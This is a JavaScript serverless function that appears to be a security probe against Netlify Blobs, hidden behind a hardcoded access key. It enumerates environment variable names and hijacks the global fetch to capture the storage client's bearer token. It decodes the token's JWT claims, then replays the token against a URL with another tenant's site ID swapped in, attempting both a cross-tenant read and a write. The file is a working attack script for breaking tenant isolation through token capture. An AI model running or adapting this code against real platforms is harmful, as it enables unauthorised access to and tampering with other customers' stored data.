// Phase-2 Blobs runtime probe — Functions 2.0 (export default) runtime, which (unlike
// the legacy Lambda handler) should receive NETLIFY_BLOBS_CONTEXT. Key-gated; tokens
// never returned raw. Tests: does the auto edge token honor cross-tenant siteID swap?
import { getStore } from '@netlify/blobs';
const NL1 = '6f1e8c67-7bec-4c02-91f7-b0f8a6175aa6';
const NL2 = 'a0364027-1082-4eb6-b5ab-8715007f97f8';

export default async (req, context) => {
  const url = new URL(req.url);
  if (url.searchParams.get('k') !== 'bl0bx7q2z9k4') return new Response('forbidden', { status: 403 });

  const out = {
    runtime: 'functions2',
    ctx_keys: Object.keys(context || {}),
    blobs_ctx_present: !!process.env.NETLIFY_BLOBS_CONTEXT,
    env_keys: Object.keys(process.env).sort(),
  };

  // capture the auto edge request the blobs client makes
  const captured = [];
  const of = globalThis.fetch;
  globalThis.fetch = async (u, o) => {
    let a = null;
    try { const h = o && o.headers; a = h ? (typeof h.get === 'function' ? h.get('authorization') : (h.authorization || h.Authorization)) : null; } catch (e) {}
    captured.push({ url: String(u), method: (o && o.method) || 'GET', auth: a });
    return of(u, o);
  };
  try {
    const s = getStore('recon2');
    await s.set('k', 'v-' + Date.now());
    out.self_set = 'ok';
    out.self_get = (await s.get('k')) || null;
  } catch (e) { out.self_err = String(e && (e.stack || e)).slice(0, 220); }
  globalThis.fetch = of;

  out.captured = captured.map(c => ({ method: c.method, hasAuth: !!c.auth, url: String(c.url).replace(/token=[^&]+/g, 'token=<t>').replaceAll(NL1, '<NL1>') }));

  const withAuth = captured.find(c => c.auth) || captured.find(c => String(c.url).includes(NL1));
  if (withAuth && withAuth.auth) {
    const tok = withAuth.auth.replace(/^Bearer\s+/i, '');
    out.token_is_jwt = tok.split('.').length === 3;
    if (out.token_is_jwt) {
      try { out.token_claims = JSON.parse(Buffer.from(tok.split('.')[1].replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8')); } catch (e) {}
    } else { out.token_len = tok.length; }
    const doReq = async (u, m, b) => {
      try {
        const r = await of(u, { method: m, headers: { authorization: 'Bearer ' + tok }, body: b, signal: AbortSignal.timeout(6000) });
        const t = await r.text();
        return { status: r.status, body: t.slice(0, 160) };
      } catch (e) { return { error: String(e).slice(0, 120) }; }
    };
    const xurl = String(withAuth.url).replaceAll(NL1, NL2);
    out.xtenant_url = xurl.replace(/token=[^&]+/g, 'token=<t>');
    out.xtenant_get = await doReq(xurl, 'GET');
    out.xtenant_put = await doReq(xurl, 'PUT', 'xt-write-from-nl1');
    out.self_control = await doReq(String(withAuth.url), 'GET');
  }
  return new Response(JSON.stringify(out, null, 2), { headers: { 'content-type': 'application/json' } });
};
